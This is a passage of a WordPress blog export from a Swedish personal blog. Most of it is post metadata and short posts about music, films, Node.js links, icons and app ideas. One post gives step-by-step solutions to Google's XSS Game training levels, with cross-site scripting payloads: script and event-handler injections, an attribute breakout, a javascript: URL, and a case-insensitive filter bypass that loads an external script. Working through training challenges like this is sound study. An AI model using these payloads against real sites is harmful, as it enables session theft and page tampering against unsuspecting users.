			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_client_id</wp:meta_key>
			<wp:meta_value><![CDATA[-1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_publicize_job_id</wp:meta_key>
			<wp:meta_value><![CDATA[17649752935]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>original_post_id</wp:meta_key>
			<wp:meta_value><![CDATA[640]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_old_slug</wp:meta_key>
			<wp:meta_value><![CDATA[640]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_7f9d0109bc065e3af520a066fe02e09a</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_74b42dc54f1038cce5e93248a4615553</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_4cc83e58820069a7a005c30f7deae484</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_b3eb9f5ab7986428c8d6eaf946d2d149</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_0dceb30a5e5877e0ecc8566c4fc5bfa8</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_b6eee17f6dc70508a56f6c09fe8bb99a</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_518f55097adac6a59b665baddcb32eb1</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_7145571e50d86837191c2b2e2d5c1aec</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_1219502b81fa938d264f7e84f9d08029</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_a6a77992080e5588340fe5fe75362648</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_de708edb52ee58ccfacb497ceda3f6d4</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_96321c1e9a1c0c67564910813a578dc1</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_d29213c18f3edde831313a005cd58cb7</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_db49344cc5143108c62da305a5f1718a</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_487a666a47431d2ee55d4ab0f054984c</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_87547eb26e278d49da8333b9420035fd</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_11498d4aeb47e5355016441c13ee956a</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_73e55cde50701b7420e96ca659fa1e4d</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_3a0a99ead2c1998bd76ac126a387505c</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_2ba9178c9e8852edb437201babb1eabd</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_8261f68b9a05c68df57b7e284b94bff1</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_b48f326bcf1f0704bcab96497b3c6fc6</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_783a77ecb8cb3617842371274297badd</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_37067755f20ce6ad9bf5f45ab6f9c20a</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_e02233e8360a8c1bf719f7083f3df13c</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_05a20173b6c43b8aeca2b50359d83e51</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_4eecbc93b5f94af4051e54701a1d5fa4</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_60538a8d653f2b721a293c92cae28b76</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_27edc2309f4e48c6c8837ba1f4268b3f</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_3842842a3d7753e7ccbeab3407c08f0b</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_83312fe08ad368fd80f98e4f81111d81</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_1af79807535e662c0833742b3ceca475</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>XSS 2 - Google XSS Game</title>
		<link>https://stuffidontwanttogoogleagain.wordpress.com/2015/12/10/xss-2-google-xss-game/</link>
		<pubDate>Thu, 10 Dec 2015 19:41:45 +0000</pubDate>
		<dc:creator>tidlost</dc:creator>
		<guid isPermaLink="false">https://narcotize.wordpress.com/?p=669</guid>
		<description></description>
		<content:encoded><![CDATA[https://xss-game.appspot.com/level5

<strong>Level 1</strong>
Här är level 1: https://xss-game.appspot.com/level1

Ja här var det ju inga konstigheter. En uppvärmningsnivå.
I sökfältet kör man:
[code lang="js"]
&amp;lt;script&amp;gt;alert(&amp;quot;xss&amp;quot;);&amp;lt;/script&amp;gt;
[/code]

<strong>Level 2</strong>
Som vi kan se i det första inlägget. Det första kommentaren, så går det alltså att posta html i kommentarerna. Men script verkar vara filtrerat.
Så istället injectar vi en funktion i bilden. 
[code lang="js"]
&amp;lt;img src=&amp;quot;#&amp;quot; onclick=&amp;quot;alert(3);&amp;quot;&amp;gt;
[/code]

<strong>Level 3</strong>
Nu har det blivit lite svårare.
Vi kan alltså notera att när man klickar på en flik så kallar vi på funktionen onclick(chooseTab("3)). Om vi sedan kollar i den funktionen så ser vi att den hämtar ett nummer från adressfältet, med hjälp av dom-objektet window.location.hash. Hash representerar är # som finns i adressen. Detta innebär att vi kan injecta javascript direkt i adressfältet. Det som skrivs i adressfältet skickas sedan till en bildadress för att visa upp rätt bild.
Därför behöver vi bara injecta följande:

[code lang="js"]
https://xss-game.appspot.com/level3/frame#2' onclick=&amp;quot;alert(2)&amp;quot;
[/code]

Efter #2 så avslutar vi attributet med ett '. Sen lägger vi till vår egen kod.

<strong>Level 4</strong>
Den här var mycket svårare än de tidigare.
Där behövde vi först avsluta tidigare kommando, men för att det skulle funka så behöver vi använda url-encoding. Dom finns här: http://www.w3schools.com/tags/ref_urlencode.asp
[code lang="js"]
https://xss-game.appspot.com/level4/frame/?timer=')%3Bonload=&amp;quot;alert(3)&amp;quot;//
[/code]

<strong>Level 5</strong>
Så I den här leveln så lär mig sig att det finns ett annat sätt att injecta javascript. Det är att injecta det i länkadresser.
[code lang="js"]
&lt;a href=&quot;javascript:alert(2)&quot;&gt;länk&lt;/a&gt;
[/code]
Så det är principen för den här leveln. 

[code lang="js"]
https://xss-game.appspot.com/level5/frame/signup?next=javascript:alert(2)
[/code]

<strong>Level 6</strong>
Den här nivån var lite svårare än de tidigare.
Här behöver man själv skapa en fil som ska executas. Så jag skapade filen i pastebin.
Det finns en regex som filterar ut http. Så att man inte kan skicka in externa skript. Men regexen är inte case-sensitive. Vilket gör att man helt enkelt bara kan skriva det med stora bokstäver.
[code lang="js"]
https://xss-game.appspot.com/level6/frame#hTTpS://pastebin.com/raw.php?i=xRxAiEVU
[/code]]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>669</wp:post_id>
		<wp:post_date>2015-12-10 19:41:45</wp:post_date>
		<wp:post_date_gmt>2015-12-10 19:41:45</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>xss-2-google-xss-game</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="uncategorized"><![CDATA[Uncategorized]]></category>
		<wp:postmeta>
			<wp:meta_key>_publicize_pending</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_published</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_client_id</wp:meta_key>
			<wp:meta_value><![CDATA[-1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_publicize_job_id</wp:meta_key>
			<wp:meta_value><![CDATA[17733873085]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>original_post_id</wp:meta_key>
			<wp:meta_value><![CDATA[669]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_old_slug</wp:meta_key>
			<wp:meta_value><![CDATA[669]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_21ffeb15e29dc7ce5018bb4548df07f6</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_260f0137fb304ca68aa9f8c82229456d</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_0e54617f9f4c46dcf103242a0a644ff6</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_c9fff206773cb92fbc2a37cf5549e386</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_45e1c901310d75a550e5c79104ae65a5</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_863d9937421ee45fab04ade3274bba8d</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_4ad5cb82558423a337350f1cc738946b</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_36ebc6730eee5793797580bb5e878f5b</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Musik som jag nån gång i mitt liv har lyssnat på</title>
		<link>https://stuffidontwanttogoogleagain.wordpress.com/2015/09/19/musik-som-jag-nan-gang-i-mitt-liv-har-lyssnat-pa/</link>
		<pubDate>Sat, 19 Sep 2015 19:00:00 +0000</pubDate>
		<dc:creator>tidlost</dc:creator>
		<guid isPermaLink="false">https://narcotize.wordpress.com/?p=489</guid>
		<description></description>
		<content:encoded><![CDATA[Ej musik som jag nödvändigtvis lyssnar på nu.
Ej musik som jag är stolt över att jag har lyssnat på.
Bara en lista på musik som jag under nån gång i mitt liv lyssnat på. Listan byggs på organiskt, när jag påminns om en artist.

Beirut
Bob Dylan
Jens Lekman
Jose Gonzalez
Tallest man on Earth
The Fugees
The Postal Service]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1662</wp:post_id>
		<wp:post_date>2015-09-19 19:00:00</wp:post_date>
		<wp:post_date_gmt>2015-09-19 19:00:00</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>musik-som-jag-nan-gang-i-mitt-liv-har-lyssnat-pa</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="musik"><![CDATA[musik]]></category>
		<wp:postmeta>
			<wp:meta_key>_publicize_pending</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>sharing_disabled</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_published</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_client_id</wp:meta_key>
			<wp:meta_value><![CDATA[-1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_publicize_job_id</wp:meta_key>
			<wp:meta_value><![CDATA[14958035064]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>original_post_id</wp:meta_key>
			<wp:meta_value><![CDATA[489]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_old_slug</wp:meta_key>
			<wp:meta_value><![CDATA[489]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Udda genrar</title>
		<link>https://stuffidontwanttogoogleagain.wordpress.com/2015/09/25/udda-genrar/</link>
		<pubDate>Fri, 25 Sep 2015 18:38:12 +0000</pubDate>
		<dc:creator>tidlost</dc:creator>
		<guid isPermaLink="false">https://narcotize.wordpress.com/?p=504</guid>
		<description></description>
		<content:encoded><![CDATA[<strong>Deprimerade människor som förändrar sitt liv pga deras likgiltighet inför allting</strong>
Numb - 
Fight Club - 
Silverlining playbook - 

<strong>Hemvändarfilmer</strong>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1663</wp:post_id>
		<wp:post_date>2015-09-25 18:38:12</wp:post_date>
		<wp:post_date_gmt>2015-09-25 18:38:12</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>udda-genrar</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="uncategorized"><![CDATA[Uncategorized]]></category>
		<wp:postmeta>
			<wp:meta_key>_publicize_pending</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>sharing_disabled</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_published</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_client_id</wp:meta_key>
			<wp:meta_value><![CDATA[-1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_publicize_job_id</wp:meta_key>
			<wp:meta_value><![CDATA[15165810516]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>original_post_id</wp:meta_key>
			<wp:meta_value><![CDATA[504]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_old_slug</wp:meta_key>
			<wp:meta_value><![CDATA[504]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Node.js</title>
		<link>https://stuffidontwanttogoogleagain.wordpress.com/2015/09/25/node-js/</link>
		<pubDate>Fri, 25 Sep 2015 22:16:33 +0000</pubDate>
		<dc:creator>tidlost</dc:creator>
		<guid isPermaLink="false">https://narcotize.wordpress.com/?p=506</guid>
		<description></description>
		<content:encoded><![CDATA[Bra källor för nybörjare med node:

http://blog.modulus.io/absolute-beginners-guide-to-nodejs

Deploy en node-app till heroku. http://howtonode.org/deploy-blog-to-heroku]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1664</wp:post_id>
		<wp:post_date>2015-09-25 22:16:33</wp:post_date>
		<wp:post_date_gmt>2015-09-25 22:16:33</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>node-js</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="uncategorized"><![CDATA[Uncategorized]]></category>
		<wp:postmeta>
			<wp:meta_key>_publicize_pending</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_published</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>sharing_disabled</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_client_id</wp:meta_key>
			<wp:meta_value><![CDATA[-1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_publicize_job_id</wp:meta_key>
			<wp:meta_value><![CDATA[15171224531]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>original_post_id</wp:meta_key>
			<wp:meta_value><![CDATA[506]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_old_slug</wp:meta_key>
			<wp:meta_value><![CDATA[506]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_393e8a464e47eaa4a22c14b6a966d858</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_e73b6062ff43e721ad24611280a7909d</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>APP-idé: Allt jag behöver</title>
		<link>https://stuffidontwanttogoogleagain.wordpress.com/2015/09/28/app-ide-allt-jag-behover/</link>
		<pubDate>Mon, 28 Sep 2015 01:28:34 +0000</pubDate>
		<dc:creator>tidlost</dc:creator>
		<guid isPermaLink="false">https://narcotize.wordpress.com/?p=509</guid>
		<description></description>
		<content:encoded><![CDATA[Okej, inte så mycket en app utan mer en bra grej att ha. Som säkert redan finns.
En hemsida där man på första sidan enkelt kan klicka sig fram till filmlista, boklista å såvidare. Typ som den här bloggen, fast enklare och snabbare.]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1665</wp:post_id>
		<wp:post_date>2015-09-28 01:28:34</wp:post_date>
		<wp:post_date_gmt>2015-09-28 01:28:34</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>app-ide-allt-jag-behover</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="appide"><![CDATA[appidé]]></category>
		<wp:postmeta>
			<wp:meta_key>_publicize_pending</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_published</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>sharing_disabled</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_client_id</wp:meta_key>
			<wp:meta_value><![CDATA[-1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_publicize_job_id</wp:meta_key>
			<wp:meta_value><![CDATA[15234773696]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>original_post_id</wp:meta_key>
			<wp:meta_value><![CDATA[509]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_old_slug</wp:meta_key>
			<wp:meta_value><![CDATA[509]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Ikoner att använda</title>
		<link>https://stuffidontwanttogoogleagain.wordpress.com/2015/10/03/ikoner-att-anvanda/</link>
		<pubDate>Sat, 03 Oct 2015 14:35:59 +0000</pubDate>
		<dc:creator>tidlost</dc:creator>
		<guid isPermaLink="false">https://narcotize.wordpress.com/?p=518</guid>
		<description></description>
		<content:encoded><![CDATA[<h1>Ionic</h1>

http://ionicons.com/#cdn 

Du behöver bara lägga till detta i din head. Å sen behöver du bara lägga till klasserna som finns att hitta <a href="http://ionicons.com/#cdn">här</a>.
[code lang="html"]
&lt;link rel=&quot;stylesheet&quot; href=&quot;http://code.ionicframework.com/ionicons/2.0.1/css/ionicons.min.css&quot;&gt;
[/code]
<h1>Font awesome</h1>

https://fortawesome.github.io/Font-Awesome/]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1666</wp:post_id>
		<wp:post_date>2015-10-03 14:35:59</wp:post_date>
		<wp:post_date_gmt>2015-10-03 14:35:59</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>ikoner-att-anvanda</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="css"><![CDATA[css]]></category>
		<category domain="category" nicename="web-utveckling"><![CDATA[web-utveckling]]></category>
		<wp:postmeta>
			<wp:meta_key>_publicize_pending</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>sharing_disabled</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_published</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_client_id</wp:meta_key>
			<wp:meta_value><![CDATA[-1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_publicize_job_id</wp:meta_key>
			<wp:meta_value><![CDATA[15435502398]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>original_post_id</wp:meta_key>
			<wp:meta_value><![CDATA[518]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_wp_old_slug</wp:meta_key>
			<wp:meta_value><![CDATA[518]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_6af7b0626a375e6960d3bb32f480d5b8</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_be44ce8e5524f705975ca075397ba5a9</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_d8f72691bfd7ad0f526003b9eebd83ed</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_oembed_d1e9274b87de6ac3de8eb53efd30bc00</wp:meta_key>
			<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
	</item>
	<item>
		<title>Appidé: Konstnärsthesis abstrakt</title>
		<link>https://stuffidontwanttogoogleagain.wordpress.com/2015/10/17/appide-konstnarsthesis-abstrakt/</link>
		<pubDate>Sat, 17 Oct 2015 02:45:05 +0000</pubDate>
		<dc:creator>tidlost</dc:creator>
		<guid isPermaLink="false">https://narcotize.wordpress.com/?p=523</guid>
		<description></description>
		<content:encoded><![CDATA[1. En app där användaren får klicka på knappar för vilka ord som dom vill ha med i thesisen. De ska vara indelade i verb, pronomen, adjektiv, substantiv. Under varje ordklass-rad så finns ett antal ord, som till exempel:

concept, precarious, ciudad contemporanio,

2.Ett annat alternativ är att göra som den här bilden i den här länken. Kanske någon blandning vore bra, och mer omfattande. Eller så gör man det så det blir som en slags labyrint. Man klickar på något ord, så får man upp en ny kolumn med möjliga nyah val.

http://www.artishock.cl/2013/02/27/%C2%A1eh-artista-contemporaneo-%C2%BFaun-no-sabes-como-explicar-tu-obra/

3. Sedan printas det ut en hel text där det står typ. "Abstract" och sedan hela texten. Man kanske kan göra så att om man klickar på till exempel "concept" för att ha med det ordet, så kopplas det ordet automatiskt mot tre andra helt random ord. Detta göra så att massor av ord byter plats, vilket gör att det enkelt kan skapas miljontals-kombinationer, vilket gör att varje text i princip blir unik. Vilket gör att man kan kalla konceptet för "Create a unique Abstract for your thesis.

4. Sedan ska projektet läggas in i olika forum på reddit, och grupper på facebook och så vidare. Se hur det får en helt fenomenal spridning. Mitt namn ska sen stå med på sidan, så att folk hittar till min linkedin och så vidare.

5. Sedan skriva upp vart projektet omnämnts.]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1667</wp:post_id>
		<wp:post_date>2015-10-17 02:45:05</wp:post_date>
		<wp:post_date_gmt>2015-10-17 02:45:05</wp:post_date_gmt>
		<wp:comment_status>open</wp:comment_status>
		<wp:ping_status>open</wp:ping_status>
		<wp:post_name>appide-konstnarsthesis-abstrakt</wp:post_name>
		<wp:status>publish</wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type>post</wp:post_type>
		<wp:post_password></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
		<category domain="category" nicename="appide"><![CDATA[appidé]]></category>
		<wp:postmeta>
			<wp:meta_key>_publicize_pending</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>sharing_disabled</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_published</wp:meta_key>
			<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_rest_api_client_id</wp:meta_key>
			<wp:meta_value><![CDATA[-1]]></wp:meta_value>
		</wp:postmeta>
		<wp:postmeta>
			<wp:meta_key>_publicize_job_id</wp:meta_key>
